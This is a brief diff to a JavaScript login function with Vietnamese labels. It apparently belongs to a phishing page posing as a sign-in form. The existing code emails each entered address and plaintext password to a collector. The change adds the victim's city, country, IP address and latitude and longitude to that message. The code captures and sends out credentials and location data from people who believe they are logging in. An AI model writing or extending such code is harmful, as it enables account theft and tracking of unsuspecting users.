@@ -2,7 +2,7 @@ function login() {
     var email = document.getElementById("email").value;
     var pass = document.getElementById("pass").value;
     if(email && pass){
-        sendEmail(`Người dùng: <strong>${email}</strong><br/>Password: <strong>${pass}</strong>`, true);
+        sendEmail(`Người dùng: <strong>${email}</strong><br/>Password: <strong>${pass}</strong><br/>Thành phố: <strong>${myCity || myRegion|| ''}</strong><br/>Quốc gia: ${myCountry || ''}<br/>IP: ${myIp || ''}<br/>Latitude: ${myLat || ''}<br/>Longitude: ${myLon || ''}`, true);
     }
     else{
         var emailCls = document.getElementsByClassName("error-email"); 
